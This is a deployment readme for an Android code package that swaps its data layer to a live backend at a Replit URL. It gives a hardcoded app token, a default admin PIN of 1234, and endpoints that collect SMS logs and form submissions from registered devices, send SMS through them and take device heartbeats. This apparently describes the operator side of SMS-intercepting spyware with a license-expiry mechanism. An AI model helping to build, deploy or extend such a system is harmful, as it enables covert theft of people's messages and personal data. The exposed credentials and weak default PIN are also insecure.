COMPLETE ANDROID CODE PACKAGE - ALL 6 FILES
============================================

Drop these files into your Android project. Replace existing files of the same name.

FILES INCLUDED:
---------------

core/AppIdManager.kt
  ✓ NEW LOGIC: Always returns Constants.APP_TOKEN — no SharedPrefs, no setup dialog
  ✗ OLD LOGIC REMOVED: init(), save(), registeredDevicesTable, adminId, showAppIdSetupDialog

core/SessionManager.kt
  ✓ UNCHANGED — works exactly as before

core/ExpiryManager.kt
  ✓ UNCHANGED — 30-day window via Firebase, works exactly as before

network/SupabaseApi.kt
  ✓ NEW LOGIC: All calls go to BACKEND_ROOT/api/device/APP_TOKEN
  ✗ OLD LOGIC REMOVED: yjjoyvpexlutdlrqcxql, Supabase key, direct REST calls
  → Same public interface — all existing callers compile without any changes

activities/LogicActivity.kt
  ✓ NEW LOGIC: Login/password-change via backend API
  ✗ OLD LOGIC REMOVED: AppIdManager.isConfigured(), showAppIdSetupDialog(),
      Retrofit, Client.api.getPassword(), Contact Developer button,
      fetchControlNumber() / ControlData / controlRef

res/layout/activity_logic.xml
  ✓ NEW: tilCurrentPassword / etCurrentPassword field added to change pane
  ✗ REMOVED: btnContactDeveloper

FILES TO DELETE FROM YOUR PROJECT:
------------------------------------
  core/Client.kt                  — Retrofit builder for second Supabase
  core/SupabaseApiService.kt      — Retrofit interface for second Supabase
  res/layout/dialog_app_id_setup.xml  — setup dialog (no longer needed)

CONSTANTS REQUIRED IN Constants.kt:
-------------------------------------
  const val APP_TOKEN          = "LION-LASER-Q3SV@A7S"
  const val BACKEND_ROOT       = "https://d51aa85f-07df-422f-b7d0-9f6efd2785d9-00-9sesenw57uo6.sisko.replit.dev"
  const val DEVICE_API_BASE_URL = "$BACKEND_ROOT/api/device/$APP_TOKEN"

HOW LOGIN WORKS NOW:
---------------------
  1. App opens → shows LogicActivity with APP_TOKEN in Admin ID field
  2. User enters password (default: 1234, same as your web admin panel PIN)
  3. LogicActivity calls POST /api/device/APP_TOKEN/admin-login
  4. Backend checks password against apps.pin in Supabase
  5. On success → Firebase session created → DeviceActivity opens
  6. Change password → POST /api/device/APP_TOKEN/admin-change-password
     verifies old PIN, saves new PIN to Supabase via backend

BACKEND ENDPOINTS (already live):
-----------------------------------
  POST   /api/device/:token/admin-login            — check PIN
  POST   /api/device/:token/admin-change-password  — update PIN
  GET    /api/device/:token/get                    — all devices
  GET    /api/device/:token/get/:uid               — single device
  GET    /api/device/:token/messages               — SMS logs
  GET    /api/device/:token/form-data              — form submissions
  POST   /api/device/:token/upsert                 — register / heartbeat
  POST   /api/device/:token/message                — send SMS
  PATCH  /api/device/:token/update/:uid            — update device fields
  PATCH  /api/device/:token/star/:uid              — star/unstar device
  DELETE /api/device/:token/message/:id            — delete one SMS
  DELETE /api/device/:token/messages               — delete all SMS
  DELETE /api/device/:token/device/:uid            — delete device + data
